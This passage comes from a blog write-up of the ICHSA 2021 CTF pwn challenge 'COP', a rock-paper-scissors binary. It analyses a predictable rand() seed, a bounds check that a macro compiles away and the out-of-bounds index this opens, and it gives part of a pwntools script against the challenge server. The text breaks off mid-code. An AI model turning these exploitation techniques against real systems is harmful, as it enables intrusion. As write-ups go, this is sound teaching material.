@@ -1,0 +1,422 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>ICHSA 2021: COP - 152334H</title><meta name=Description content="A slightly less boring problem."><meta property="og:title" content="ICHSA 2021: COP"><meta property="og:description" content="A slightly less boring problem."><meta property="og:type" content="article"><meta property="og:url" content="https://152334H.github.io/blog/icsha-2021-cop/"><meta property="og:image" content="https://152334H.github.io/undefined.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-03T07:19:04+08:00"><meta property="article:modified_time" content="2022-08-20T09:56:31+01:00"><meta property="og:site_name" content="152334H"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://152334H.github.io/undefined.png"><meta name=twitter:title content="ICHSA 2021: COP"><meta name=twitter:description content="A slightly less boring problem."><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://152334H.github.io/blog/icsha-2021-cop/><link rel=next href=https://152334H.github.io/blog/redpwn-2021-panda-food/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ICHSA 2021: COP","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/152334H.github.io\/blog\/icsha-2021-cop\/"},"genre":"posts","keywords":"pwn, writeup","wordcount":1316,"url":"https:\/\/152334H.github.io\/blog\/icsha-2021-cop\/","datePublished":"2021-06-03T07:19:04+08:00","dateModified":"2022-08-20T09:56:31+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"152334H"},"description":"A slightly less boring problem."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>All Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/><b>About </b></a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=Search... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=Search... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>All Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title><b>About</b></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ICHSA 2021: COP</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://152334H.github.io/ title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>152334H</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime="June 3, 2021">June 3, 2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1316 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;7 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#bugs>Bugs</a></li><li><a href=#full-script>Full script</a></li></ul></nav></div></div><div class=content id=content><p>There weren&rsquo;t many pwn challenges in <a href=https://ctftime.org/event/1359/tasks/ target=_blank rel="noopener noreffer">ICHSA CTF</a>, but this challenge was a little bit fun for its originality.</p><h1 id=cophttpsgithubcomirs-cybersecctfdumpblobmasterichsa202021copmd-500><a href=https://github.com/IRS-Cybersec/ctfdump/blob/master/ICHSA%202021/COP.md target=_blank rel="noopener noreffer">COP</a> [500]</h1><p>Hi COP</p><p>I wrote a game that should be impossible to win.</p><p>A friend of mine managed to get the flag in a few seconds.</p><p>Can you help me find out how?</p><p>Connect: <code>nc cop.ichsa.ctf.today 8011</code></p><p>challenge author: <a href=https://twitter.com/YKuszer target=_blank rel="noopener noreffer">Yossef Kuszer</a></p><p>Files: <a href=https://ichsa.ctf.today/files/1670d2f68b067aec559c8d75eecc3285/COP.zip target=_blank rel="noopener noreffer"><code>COP.zip</code></a></p><p>Original:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ tree COP
+</span></span><span class=line><span class=cl>COP
+</span></span><span class=line><span class=cl>├── chalenge.c
+</span></span><span class=line><span class=cl>├── chalenge.h
+</span></span><span class=line><span class=cl>├── cop.gif
+</span></span><span class=line><span class=cl>├── description.md
+</span></span><span class=line><span class=cl>├── Dockerfile
+</span></span><span class=line><span class=cl>├── DockerInstructions.md
+</span></span><span class=line><span class=cl>└── flag.txt
+</span></span></code></pre></td></tr></table></div></div><p>Updated version:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ unzip -l COP.zip
+</span></span><span class=line><span class=cl>Archive:  COP.zip
+</span></span><span class=line><span class=cl>  Length      Date    Time    Name
+</span></span><span class=line><span class=cl>---------  ---------- -----   ----
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2021-06-01 22:13   COP1/
+</span></span><span class=line><span class=cl>    <span class=m>15690</span>  2021-05-09 20:29   COP1/chalenge.c
+</span></span><span class=line><span class=cl>    <span class=m>71732</span>  2021-05-06 10:43   COP1/chalenge.h
+</span></span><span class=line><span class=cl>  <span class=m>3916371</span>  2021-05-09 20:52   COP1/cop.gif
+</span></span><span class=line><span class=cl>      <span class=m>190</span>  2021-05-10 09:01   COP1/description.md
+</span></span><span class=line><span class=cl>      <span class=m>519</span>  2021-05-09 20:25   COP1/Dockerfile
+</span></span><span class=line><span class=cl>      <span class=m>119</span>  2021-05-10 09:55   COP1/DockerInstructions.md
+</span></span><span class=line><span class=cl>       <span class=m>21</span>  2021-05-30 12:28   COP1/flag.txt
+</span></span><span class=line><span class=cl>  <span class=m>1035536</span>  2021-06-01 22:05   COP1/game
+</span></span><span class=line><span class=cl>---------                     -------
+</span></span><span class=line><span class=cl>  <span class=m>5040178</span>                     <span class=m>9</span> files
+</span></span></code></pre></td></tr></table></div></div><p>The binary is compiled with <code>-static</code>, so there&rsquo;s no need for libc. As for the binary itself:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;game&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+</span></span><span class=line><span class=cl>    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>     <span class=err>!</span>
+</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
+</span></span><span class=line><span class=cl>    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
+</span></span><span class=line><span class=cl>    <span class=n>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=n>PIE</span> <span class=p>(</span><span class=mh>0x400000</span><span class=p>)</span> <span class=err>!</span>
+</span></span></code></pre></td></tr></table></div></div><p>Source code is provided, so I&rsquo;ll be skipping on the usual decompilation effort.</p><h2 id=bugs>Bugs</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>+===============================================+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>   <span class=n>Wellcome</span> <span class=n>to</span> <span class=n>my</span> <span class=n>Rock</span><span class=o>-</span><span class=n>Paper</span><span class=o>-</span><span class=n>Scissors</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>game</span>   <span class=o>|</span>
+</span></span><span class=line><span class=cl><span class=o>+-----------------------------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>Current</span> <span class=nl>score</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>NOOB</span> <span class=nl>player</span><span class=p>:</span> <span class=mi>0</span> <span class=n>Points</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nl>Computer</span><span class=p>:</span> <span class=mi>0</span> <span class=n>Points</span>
+</span></span><span class=line><span class=cl><span class=o>+-----------------------------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nl>Options</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>1</span><span class=p>)</span> <span class=n>Display</span> <span class=n>game</span> <span class=n>rules</span> <span class=o>-------------</span> <span class=p>(</span><span class=mi>0</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>2</span><span class=p>)</span> <span class=n>Play</span> <span class=n>next</span> <span class=n>round</span> <span class=o>----------------</span> <span class=p>(</span><span class=mi>0</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>3</span><span class=p>)</span> <span class=n>Skip</span> <span class=n>N</span> <span class=n>rounds</span> <span class=o>------------------</span> <span class=p>(</span><span class=mi>2</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>4</span><span class=p>)</span> <span class=n>Enable</span> <span class=n>Ascii</span><span class=o>-</span><span class=n>art</span> <span class=o>---------------</span> <span class=p>(</span><span class=mi>3</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>5</span><span class=p>)</span> <span class=n>Change</span> <span class=n>user</span> <span class=n>name</span> <span class=o>---------------</span> <span class=p>(</span><span class=mi>5</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>6</span><span class=p>)</span> <span class=n>Print</span> <span class=n>the</span> <span class=n>flag</span><span class=o>!</span> <span class=o>-------</span> <span class=p>(</span><span class=mi>4294967295</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>7</span><span class=p>)</span> <span class=n>Exit</span> <span class=o>---------------------------</span> <span class=p>(</span><span class=mi>0</span> <span class=n>Points</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>+-----------------------------------------------+</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>Please</span> <span class=n>chose</span> <span class=n>an</span> <span class=n>option</span> <span class=p>[</span> <span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>The challenge provided is a simple rock-paper-scissors simulator, limited to <code>ARRAY_OF_PLAYS_MAX_SIZE == 170</code> rounds. When the game starts, the program will initialize the 170 moves the computer plans to play using <code>rand()/srand()</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=c1>// initializing pseudo-random values and populate array_of_plays
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>srand</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>ARRAY_OF_PLAYS_MAX_SIZE</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>array_of_plays</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>id</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>array_of_plays</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>handsign</span> <span class=o>=</span> <span class=p>(</span><span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=n>MAX_HANDSIGNS</span><span class=p>)</span> <span class=o>+</span> <span class=n>MIN_HANDSIGN</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>array_of_plays</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>animation_function</span> <span class=o>=</span> <span class=n>print_ascii</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>rand()</code> is <a href=https://github.com/Naetw/CTF-pwn-tips#predictable-rngrandom-number-generator target=_blank rel="noopener noreffer">predictable</a>, and we can win every round of Rock-Paper-Scissors with 100% accuracy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;game&#39;</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
+</span></span><span class=line><span class=cl><span class=n>clib</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>clib</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ARRAY_OF_PLAYS_MAXSIZE</span> <span class=o>=</span> <span class=mi>170</span>
+</span></span><span class=line><span class=cl><span class=n>array_of_plays</span> <span class=o>=</span> <span class=p>[</span><span class=n>clib</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>%</span><span class=mi>3</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>ARRAY_OF_PLAYS_MAXSIZE</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl><span class=n>current_play</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;cop.ichsa.ctf.today&#39;</span><span class=p>,</span> <span class=mi>8011</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>win_round</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>current_play</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>cpu_play</span> <span class=o>=</span> <span class=n>array_of_plays</span><span class=p>[</span><span class=n>current_play</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>current_play</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>user_play</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>:</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>:</span><span class=mi>2</span><span class=p>,</span> <span class=mi>2</span><span class=p>:</span><span class=mi>0</span><span class=p>}[</span><span class=n>cpu_play</span><span class=p>]</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>user_play</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, we&rsquo;ll never obtain the flag by just winning normal rounds, because the option to obtain the flag requires <code>4294967295 Points</code>.</p><p>This is where <code>Skip N Rounds</code> comes into play. The code for <code>skip_n_rounds()</code> seems safe enough:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>printf</span><span class=p>(</span><span class=s>&#34;| You chose to skip %u rounds</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>rounds_to_skip</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// Check for uint8_t integer overflow
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=n>OVERFLOW_CHECK</span><span class=p>(</span><span class=n>rounds_to_skip</span><span class=p>,</span><span class=n>ARRAY_OF_PLAYS_MAX_SIZE</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>SET_STATUS_TO_FALSE_AND_BREAK</span><span class=p>(</span><span class=n>status</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>current_play</span> <span class=o>+</span> <span class=n>rounds_to_skip</span> <span class=o>&gt;</span> <span class=n>ARRAY_OF_PLAYS_MAX_SIZE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>SET_STATUS_TO_FALSE_PRINT_AND_BREAK</span><span class=p>(</span><span class=n>status</span><span class=p>,</span> <span class=s>&#34;| Overflow - Not jumping</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>CHANGE_GAME_CTX_FIELD</span><span class=p>(</span><span class=n>current_play</span><span class=p>,</span> <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>current_play</span> <span class=o>+</span> <span class=n>rounds_to_skip</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>The last if-statement in there is bugged as a result of <code>chalenge.h</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#ifndef DEBUG_MODE
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=cp>#define POINTS_TO_PRINT_FLAG -1u </span><span class=c1>// UINT64_MAX
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg)
+</span></span></span><span class=line><span class=cl><span class=cp>#else
+</span></span></span><span class=line><span class=cl><span class=cp>#define POINTS_TO_PRINT_FLAG 0
+</span></span></span><span class=line><span class=cl><span class=cp>#define SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, msg) \
+</span></span></span><span class=line><span class=cl><span class=cp>{\
+</span></span></span><span class=line><span class=cl><span class=cp>    printf(msg);\
+</span></span></span><span class=line><span class=cl><span class=cp>    SET_STATUS_TO_FALSE_AND_BREAK(status)\
+</span></span></span><span class=line><span class=cl><span class=cp>}
+</span></span></span><span class=line><span class=cl><span class=cp>#endif
+</span></span></span></code></pre></td></tr></table></div></div><p>The macro <code>SET_STATUS_TO_FALSE_PRINT_AND_BREAK()</code> expands to nothing when <code>DEBUG_MODE</code> is off. We know that this is the case because <code>POINTS_TO_PRINT_FLAG</code> is <code>-1u</code> and not <code>0</code>.</p><p>Because of this, <code>game_ctx->current_play</code> can be increased beyond <code>ARRAY_OF_PLAYS_MAX_SIZE</code>. This results in an oob array index in <code>play_next_round()</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>play_next_round</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span> <span class=p>...</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>play</span> <span class=n>current_play</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl>        <span class=n>current_play</span> <span class=o>=</span> <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>array_of_plays</span><span class=p>[</span><span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>current_play</span><span class=p>];</span>
+</span></span></code></pre></td></tr></table></div></div><p>That oob array index allows us to generate an arbitrary <code>struct play current_play</code>. To grasp why, we need to backtrack and cover a few other details.</p><p>First off, <code>game_ctx->array_of_plays == 0xC0FFEE2000</code>, and <code>game_ctx == 0xC0FFEEF000</code>. This happens because of <code>mmap()</code> address hints:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define GAME_CTX_ID (void *) 0xC0FFEEFAC3
+</span></span></span><span class=line><span class=cl><span class=cp>#define ARRAY_OF_PLAYS_ID (void *) 0xC0FFEE2A11
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>init_game</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// Allocate some memory for the game_ctx
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>game_ctx</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=n>GAME_CTX_ID</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>PROT_WRITE</span> <span class=o>|</span> <span class=n>PROT_READ</span> <span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// Allocate some memory for the game_ctx-&gt;array_of_plays
